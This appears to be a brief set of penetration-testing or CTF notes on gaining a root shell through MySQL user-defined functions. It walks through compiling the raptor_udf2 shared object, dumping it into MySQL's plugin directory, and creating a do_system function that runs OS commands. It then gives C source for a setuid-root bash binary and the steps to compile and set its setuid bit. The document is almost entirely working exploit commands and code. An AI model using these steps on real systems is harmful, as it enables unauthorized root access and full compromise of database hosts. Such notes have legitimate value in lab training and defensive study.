# Gaining a Root shell using MySQL User Defined Functions and SETUID Binaries

REF: https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/

https://ejtaal.net/infosec/lordoftheroot/

Using the raptor_udf2.c source code a shared object needs to be compiled, this will be done using the gcc compiler. This is done in a two step process; first compiling a ELF binary, then from that compiled ELF binary, a shared object is created. The two steps needed to be taken are:

-g : gen debug
-c : Compile and assemble, but do not link.

1.     gcc -g -c raptor_udf2.c
2.     gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 
                              or  
               gcc -g -shared -o raptor_udf2.so raptor_udf2.o -lc
   
Identifying the location that the plugin_dir variable in MySQL, this is where MySQL will look for the shared object file for the UDF. Create a new table in the MySQL database and insert the contents of the shared object file created into the table.
Write the contents of the new MySQL table into directory specified by the plugin_dir variable.

3. To identified the value for the plugin_dir variable in MySQL, the query    show variables like ‘plugin_dir’;
4. create table foo(line blob);
5. insert into foo values(load_file(‘/home/raptor/raptor_udf2.so’));
6. select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;

Create the function in the MySQL database.

7. create function do_system returns integer soname ‘raptor_udf2.so’;
8. select * from mysql.func;

Test that the UDF works correctly.
9. select do_system(‘id > /tmp/out; chown centos.centos /tmp/out’);
10. cat /tmp/out

ROOT BINARY : 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

11. select do_system(‘gcc -o /tmp/setuid /home/centos/setuid.c’);
    select do_system(‘chmod u+s /tmp/setuid’);
12. ./setuid

